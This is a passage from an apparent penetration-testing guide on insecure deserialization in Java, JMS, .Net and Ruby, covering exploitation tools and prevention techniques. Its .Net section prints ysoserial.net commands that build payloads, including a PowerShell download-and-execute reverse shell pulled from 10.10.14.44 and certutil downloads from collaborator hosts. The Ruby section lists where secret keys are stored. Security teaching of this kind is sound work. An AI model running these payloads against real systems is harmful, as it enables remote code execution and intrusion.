<h4 id="serialkillerbypassgadgets"><a href="#serialkillerbypassgadgets" class="headerlink" title="serialkillerbypassgadgets"></a>serialkillerbypassgadgets</h4><p>You can <strong>use</strong> <a href="https://github.com/pwntester/SerialKillerBypassGadgetCollection" target="_blank" rel="noopener"><strong>https://github.com/pwntester/SerialKillerBypassGadgetCollection</strong></a> <strong>along with ysoserial to create more exploits</strong>. More information about this tool in the <strong>slides of the talk</strong> where the tool was presented: <a href="https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1" target="_blank" rel="noopener">https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1</a></p>
<h4 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h4><p>****<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener"><strong>marshalsec</strong> </a>can be used to generate payloads to exploit different <strong>Json</strong> and <strong>Yml</strong> serialization libraries in Java.<br>In order to compile the project I needed to <strong>add</strong> this <strong>dependencies</strong> to <code>pom.xml</code>:</p>
<pre><code class="markup">&lt;dependency&gt;
        &lt;groupId&gt;javax.activation&lt;/groupId&gt;
        &lt;artifactId&gt;activation&lt;/artifactId&gt;
        &lt;version&gt;1.1.1&lt;/version&gt;
&lt;/dependency&gt;
        
&lt;dependency&gt;
        &lt;groupId&gt;com.sun.jndi&lt;/groupId&gt;
        &lt;artifactId&gt;rmiregistry&lt;/artifactId&gt;
        &lt;version&gt;1.2.1&lt;/version&gt;
        &lt;type&gt;pom&lt;/type&gt;
&lt;/dependency&gt;
</code></pre>
<p><strong>Install maven</strong>, and <strong>compile</strong> the project:</p>
<pre><code class="bash">sudo apt-get install maven
mvn clean package -DskipTests
</code></pre>
<h4 id="FastJSON"><a href="#FastJSON" class="headerlink" title="FastJSON"></a>FastJSON</h4><p>Read more about this Java JSON library: <a href="https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html" target="_blank" rel="noopener">https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html</a></p>
<h3 id="Labs"><a href="#Labs" class="headerlink" title="Labs"></a>Labs</h3><ul>
<li>If you want to test some ysoserial payloads you can <strong>run this webapp</strong>: <a href="https://github.com/hvqzao/java-deserialize-webapp" target="_blank" rel="noopener">https://github.com/hvqzao/java-deserialize-webapp</a></li>
<li><a href="https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/" target="_blank" rel="noopener">https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/</a></li>
</ul>
<h3 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h3><p>Java LOVES sending serialized objects all over the place. For example:</p>
<ul>
<li>In <strong>HTTP requests</strong> – Parameters, ViewState, Cookies, you name it.</li>
<li><strong>RMI</strong> – The extensively used Java RMI protocol is 100% based on serialization</li>
<li><strong>RMI over HTTP</strong> – Many Java thick client web apps use this – again 100% serialized objects</li>
<li><strong>JMX</strong> – Again, relies on serialized objects being shot over the wire</li>
<li><strong>Custom Protocols</strong> – Sending an receiving raw Java objects is the norm – which we’ll see in some of the exploits to come</li>
</ul>
<h3 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h3><h4 id="Transient-objects"><a href="#Transient-objects" class="headerlink" title="Transient objects"></a>Transient objects</h4><p>A class that implements <code>Serializable</code> can implement as <code>transient</code> any object inside the class that shouldn’t be serializable. For example:</p>
<pre><code class="java">public class myAccount implements Serializable
{
    private transient double profit; // declared transient
    private transient double margin; // declared transient
</code></pre>
<h4 id="Avoid-Serialization-of-a-class-that-need-to-implements-Serializable"><a href="#Avoid-Serialization-of-a-class-that-need-to-implements-Serializable" class="headerlink" title="Avoid Serialization of a class that need to implements Serializable"></a>Avoid Serialization of a class that need to implements Serializable</h4><p>Some of your application objects may be forced to implement <code>Serializable</code> due to their hierarchy. To guarantee that your application objects can’t be deserialized, a <code>readObject()</code> method should be declared (with a <code>final</code> modifier) which always throws an exception:</p>
<pre><code class="java">private final void readObject(ObjectInputStream in) throws java.io.IOException {
    throw new java.io.IOException(&quot;Cannot be deserialized&quot;);
}
</code></pre>
<h4 id="Check-deserialized-class-before-deserializing-it"><a href="#Check-deserialized-class-before-deserializing-it" class="headerlink" title="Check deserialized class before deserializing it"></a>Check deserialized class before deserializing it</h4><p>The <code>java.io.ObjectInputStream</code> class is used to deserialize objects. It’s possible to harden its behavior by subclassing it. This is the best solution if:</p>
<ul>
<li>You can change the code that does the deserialization</li>
<li>You know what classes you expect to deserialize</li>
</ul>
<p>The general idea is to override <a href="https://docs.oracle.com/javase/7/docs/api/java/io/ObjectInputStream.html#resolveClass%28java.io.ObjectStreamClass%29" target="_blank" rel="noopener"><code>ObjectInputStream.html#resolveClass()</code></a> in order to restrict which classes are allowed to be deserialized.</p>
<p>Because this call happens before a <code>readObject()</code> is called, you can be sure that no deserialization activity will occur unless the type is one that you wish to allow.</p>
<p>A simple example of this shown here, where the the <code>LookAheadObjectInputStream</code> class is guaranteed not to deserialize any other type besides the <code>Bicycle</code> class:</p>
<pre><code class="java">public class LookAheadObjectInputStream extends ObjectInputStream {

    public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }

    /**
    * Only deserialize instances of our expected Bicycle class
    */
    @Override
    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!desc.getName().equals(Bicycle.class.getName())) {
            throw new InvalidClassException(&quot;Unauthorized deserialization attempt&quot;, desc.getName());
        }
        return super.resolveClass(desc);
    }
}
</code></pre>
<p><strong>Harden All java.io.ObjectInputStream Usage with an Agent</strong></p>
<p> If you don’t own the code or can’t wait for a patch, using an agent to weave in hardening to <code>java.io.ObjectInputStream</code> is the best solution.<br>Using this approach you can only Blacklist known malicious types and not whitelist them as you don’t know which object are being serialized.</p>
<p>To enable these agents, simply add a new JVM parameter:</p>
<pre><code class="text">-javaagent:name-of-agent.jar
</code></pre>
<p>Example:  <a href="https://github.com/Contrast-Security-OSS/contrast-rO0" target="_blank" rel="noopener">rO0 by Contrast Security</a></p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
<li>Deserialization and ysoserial talk: <a href="http://frohoff.github.io/appseccali-marshalling-pickles/" target="_blank" rel="noopener">http://frohoff.github.io/appseccali-marshalling-pickles/</a></li>
<li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" target="_blank" rel="noopener">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li>
<li><a href="https://www.youtube.com/watch?v=VviY3O-euVQ" target="_blank" rel="noopener">https://www.youtube.com/watch?v=VviY3O-euVQ</a></li>
<li>Talk about gadgetinspector: <a href="https://www.youtube.com/watch?v=wPbW6zQ52w8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wPbW6zQ52w8</a> and slides: <a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf</a></li>
<li>Marshalsec paper: <a href="https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true" target="_blank" rel="noopener">https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true</a></li>
<li><a href="https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr" target="_blank" rel="noopener">https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr</a></li>
<li><a href="https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html" target="_blank" rel="noopener">https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html</a></li>
<li><a href="https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html" target="_blank" rel="noopener">https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html</a></li>
<li>Java and .Net JSON deserialization <strong>paper:</strong> <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf" target="_blank" rel="noopener"><strong>https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf</strong></a><strong>,</strong> talk: <a href="https://www.youtube.com/watch?v=oUAeWhW5b8c" target="_blank" rel="noopener">https://www.youtube.com/watch?v=oUAeWhW5b8c</a> and slides: <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf</a></li>
<li>Deserialziations CVEs: <a href="https://paper.seebug.org/123/" target="_blank" rel="noopener">https://paper.seebug.org/123/</a></li>
</ul>
<h2 id="JMS-Java-Message-Service"><a href="#JMS-Java-Message-Service" class="headerlink" title="JMS - Java Message Service"></a>JMS - Java Message Service</h2><blockquote>
<p>The <strong>Java Message Service</strong> (<strong>JMS</strong>) API is a Java message-oriented middleware API for sending messages between two or more clients. It is an implementation to handle the producer–consumer problem. JMS is a part of the Java Platform, Enterprise Edition (Java EE), and was defined by a specification developed at Sun Microsystems, but which has since been guided by the Java Community Process. It is a messaging standard that allows application components based on Java EE to create, send, receive, and read messages. It allows the communication between different components of a distributed application to be loosely coupled, reliable, and asynchronous. (From <a href="https://en.wikipedia.org/wiki/Java_Message_Service" target="_blank" rel="noopener">Wikipedia</a>).</p>
</blockquote>
<h3 id="Products"><a href="#Products" class="headerlink" title="Products"></a>Products</h3><p>There are several products using this middleware to send messages:</p>
<p><img src="../../.gitbook/assets/image%20(288).png"></p>
<p><img src="../../.gitbook/assets/image%20(50).png"></p>
<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>So, basically there are a <strong>bunch of services using JMS on a dangerous way</strong>. Therefore, if you have <strong>enough privileges</strong> to send messages to this services (usually you will need valid credentials) you could be able to send <strong>malicious objects serialized that will be deserialized by the consumer/subscriber</strong>.<br>This means that in this exploitation all the <strong>clients that are going to use that message will get infected</strong>.</p>
<p>You should remember that even if a service is vulnerable (because it’s insecurely deserializing user input) you still need to find valid gadgets to exploit the vulnerability. </p>
<p>The tool <a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noopener">JMET</a> was created to <strong>connect and attack this services sending several malicious objects serialized using known gadgets</strong>. These exploits will work if the service is still vulnerable and if any of the used gadgets is inside the vulnerable application.</p>
<h3 id="References-1"><a href="#References-1" class="headerlink" title="References"></a>References</h3><ul>
<li>JMET talk: <a href="https://www.youtube.com/watch?v=0h8DWiOWGGA" target="_blank" rel="noopener">https://www.youtube.com/watch?v=0h8DWiOWGGA</a></li>
<li>Slides: <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf</a></li>
</ul>
<h2 id="Net"><a href="#Net" class="headerlink" title=".Net"></a>.Net</h2><p>.Net is similar to Java regarding how deserialization exploits work: The <strong>exploit</strong> will <strong>abuse gadgets</strong> that <strong>execute</strong> some interesting <strong>code when</strong> an object is <strong>deserialized</strong>.</p>
<h3 id="Fingerprint"><a href="#Fingerprint" class="headerlink" title="Fingerprint"></a>Fingerprint</h3><h4 id="WhiteBox"><a href="#WhiteBox" class="headerlink" title="WhiteBox"></a>WhiteBox</h4><p>Search the source code for the following terms:</p>
<ol>
<li><code>TypeNameHandling</code></li>
<li><code>JavaScriptTypeResolver</code></li>
</ol>
<p>Look for any serializers where the type is set by a user controlled variable.</p>
<h4 id="BlackBox"><a href="#BlackBox" class="headerlink" title="BlackBox"></a>BlackBox</h4><p>You can search for the Base64 encoded string <strong>AAEAAAD/////</strong> or any other thing that <strong>may be deserialized</strong> in the back-end and that allows you to control the deserialized type**.** For example, a <strong>JSON</strong> or <strong>XML</strong> containing <code>TypeObject</code> or <code>$type</code>.</p>
<h3 id="ysoserial-net"><a href="#ysoserial-net" class="headerlink" title="ysoserial.net"></a>ysoserial.net</h3><p>In this case you can use the tool <a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener"><strong>ysoserial.net</strong></a> in order to <strong>create the deserialization exploits</strong>. Once downloaded the git repository you should <strong>compile the tool</strong> using Visual Studio for example.</p>
<p>If you want to learn about <strong>how does ysoserial.net creates it’s exploit</strong> you can <a href="basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md"><strong>check this page where is explained the ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter</strong></a>.</p>
<p>The main options of <strong>ysoserial.net</strong> are: <strong><code>--gadget</code></strong>, <strong><code>--formatter</code></strong>, <strong><code>--output</code></strong> and <strong><code>--plugin</code>.</strong></p>
<ul>
<li><strong><code>--gadget</code></strong> used to indicate the gadget to abuse (indicate the class/function that will be abused during deserialization to execute commands).</li>
<li> <strong><code>--formatter</code></strong>, used to indicated the method to serialized the exploit (you need to know which library is using the back-end to deserialize the payload and use the same to serialize it)</li>
<li> <strong><code>--output</code></strong> used to indicate if you want the exploit in <strong>raw</strong> or <strong>base64</strong> encoded. <em>Note that <strong>ysoserial.net</strong> will <strong>encode</strong> the payload using <strong>UTF-16LE</strong> (encoding used by default on Windows) so if you get the raw and just encode it from a linux console you might have some <strong>encoding compatibility problems</strong> that will prevent the exploit from working properly (in HTB JSON box the payload worked in both UTF-16LE and ASCII but this doesn’t mean it will always work).</em></li>
<li><strong><code>--plugin</code></strong> ysoserial.net supports plugins to craft <strong>exploits for specific frameworks</strong> like ViewState</li>
</ul>
<h4 id="More-ysoserial-net-parameters"><a href="#More-ysoserial-net-parameters" class="headerlink" title="More ysoserial.net parameters"></a>More ysoserial.net parameters</h4><ul>
<li><code>--minify</code> will provide a <strong>smaller payload</strong> (if possible)</li>
<li><code>--raf -f Json.Net -c &quot;anything&quot;</code> This will indicate all the gadgets that can be used with a provided formatter (<code>Json.Net</code> in this case)</li>
<li><code>--sf xml</code> you can <strong>indicate a gadget</strong> (<code>-g</code>)and ysoserial.net will search for formatters containing “xml” (case insensitive)</li>
</ul>
<p><strong>ysoserial examples</strong> to create exploits:</p>
<pre><code class="bash">#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c &quot;ping -n 5 10.10.14.44&quot; -o base64

#Timing
#I tried using ping and timeout but there wasn&#39;t any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c &quot;nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net&quot; -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c &quot;certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a&quot; -o base64

#Reverse shell
##Create shell command in linux
echo -n &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.44/shell.ps1&#39;)&quot; | iconv  -t UTF-16LE | base64 -w0
##Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c &quot;powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=&quot; -o base64
</code></pre>
<p><strong>ysoserial.net</strong> has also a <strong>very interesting parameter</strong> that helps to understand better how every exploit works: <code>--test</code><br>If you indicates this parameter <strong>ysoserial.net</strong> will <strong>try</strong> the <strong>exploit locally,</strong> so you can test if your payload will work correctly.<br>This parameter is helpful because if you review the code you will find chucks of code like the following one (from <a href="https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208" target="_blank" rel="noopener">ObjectDataProviderGenerator.cs</a>):</p>
<pre><code class="java">            if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
</code></pre>
<p>This means that in order to test the exploit the code will call <a href="https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539" target="_blank" rel="noopener">serializersHelper.JsonNet_deserialize</a></p>
<pre><code class="java">public static object JsonNet_deserialize(string str)
    {
        Object obj = JsonConvert.DeserializeObject&lt;Object&gt;(str, new JsonSerializerSettings
        {
            TypeNameHandling = TypeNameHandling.Auto
        });
        return obj;
    }
</code></pre>
<p>In the <strong>previous code is vulnerable to the exploit created</strong>. So if you find something similar in a .Net application it means that probably that application is vulnerable too.<br>Therefore the <strong><code>--test</code></strong> parameter allows us to understand <strong>which chunks of code are vulnerable</strong> to the desrialization exploit that <strong>ysoserial.net</strong> can create.</p>
<h3 id="ViewState"><a href="#ViewState" class="headerlink" title="ViewState"></a>ViewState</h3><p>Take a look to <a href="exploiting-__viewstate-parameter.md">this POST about <strong>how to try to exploit the __ViewState parameter of .Net</strong> </a>to <strong>execute arbitrary code</strong>.</p>
<h3 id="Prevention-1"><a href="#Prevention-1" class="headerlink" title="Prevention"></a><strong>Prevention</strong></h3><p>Don’t allow the datastream to define the type of object that the stream will be deserialized to. You can prevent this by for example using the <code>DataContractSerializer</code> or <code>XmlSerializer</code> if at all possible.</p>
<p>Where <code>JSON.Net</code> is being used make sure the <code>TypeNameHandling</code> is only set to <code>None</code>.</p>
<pre><code class="text">TypeNameHandling = TypeNameHandling.None
</code></pre>
<p>If <code>JavaScriptSerializer</code> is to be used then do not use it with a <code>JavaScriptTypeResolver</code>.</p>
<p>If you must deserialise data streams that define their own type, then restrict the types that are allowed to be deserialized. One should be aware that this is still risky as many native .Net types potentially dangerous in themselves. e.g.</p>
<pre><code class="text">System.IO.FileInfo
</code></pre>
<p><code>FileInfo</code> objects that reference files actually on the server can when deserialized, change the properties of those files e.g. to read-only, creating a potential denial of service attack.</p>
<p>Even if you have limited the types that can be deserialised remember that some types have properties that are risky. <code>System.ComponentModel.DataAnnotations.ValidationException</code>, for example has a property <code>Value</code> of type <code>Object</code>. if this type is the type allowed for deserialization then an attacker can set the <code>Value</code> property to any object type they choose.</p>
<p>Attackers should be prevented from steering the type that will be instantiated. If this is possible then even <code>DataContractSerializer</code> or <code>XmlSerializer</code> can be subverted e.g.</p>
<pre><code class="text">// Action below is dangerous if the attacker can change the data in the database
var typename = GetTransactionTypeFromDatabase();  

var serializer = new DataContractJsonSerializer(Type.GetType(typename));

var obj = serializer.ReadObject(ms);
</code></pre>
<p>Execution can occur within certain .Net types during deserialization. Creating a control such as the one shown below is ineffective.</p>
<pre><code class="text">var suspectObject = myBinaryFormatter.Deserialize(untrustedData);

//Check below is too late! Execution may have already occurred.
if (suspectObject is SomeDangerousObjectType)
{
    //generate warnings and dispose of suspectObject
}
</code></pre>
<p>For <code>BinaryFormatter</code> and <code>JSON.Net</code> it is possible to create a safer form of white list control using a custom <code>SerializationBinder</code>.</p>
<p>Try to keep up-to-date on known .Net insecure deserialization gadgets and pay special attention where such types can be created by your deserialization processes. <strong>A deserializer can only instantiate types that it knows about</strong>.</p>
<p>Try to keep any code that might create potential gadgets separate from any code that has internet connectivity. As an example <code>System.Windows.Data.ObjectDataProvider</code> used in WPF applications is a known gadget that allows arbitrary method invocation. It would be risky to have this a reference to this assembly in a REST service project that deserializes untrusted data.</p>
<h3 id="References-2"><a href="#References-2" class="headerlink" title="References"></a><strong>References</strong></h3><ul>
<li>Java and .Net JSON deserialization <strong>paper:</strong> <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf" target="_blank" rel="noopener"><strong>https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf</strong></a><strong>,</strong> talk: <a href="https://www.youtube.com/watch?v=oUAeWhW5b8c" target="_blank" rel="noopener">https://www.youtube.com/watch?v=oUAeWhW5b8c</a> and slides: <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp" target="_blank" rel="noopener">https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp</a></li>
<li><a href="https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf</a></li>
<li><a href="https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization" target="_blank" rel="noopener">https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization</a></li>
</ul>
<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a><strong>Ruby</strong></h2><p>Ruby has two methods to implement serialization inside the <strong>marshal</strong> library: first method is <strong>dump</strong> that converts object into bytes streams <strong>(serialize)</strong>. And the second method is <strong>load</strong> to convert bytes stream to object again (<strong>deserialize</strong>).<br>Ruby uses HMAC to sign the serialized object and saves the key on one of the following files:</p>
<ul>
<li>config/environment.rb</li>
<li>config/initializers/secret_token.rb</li>
<li>config/secrets.yml</li>
<li>/proc/self/environ</li>
</ul>
<p>TODO: Review <a href="https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/" target="_blank" rel="noopener">https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/</a></p>
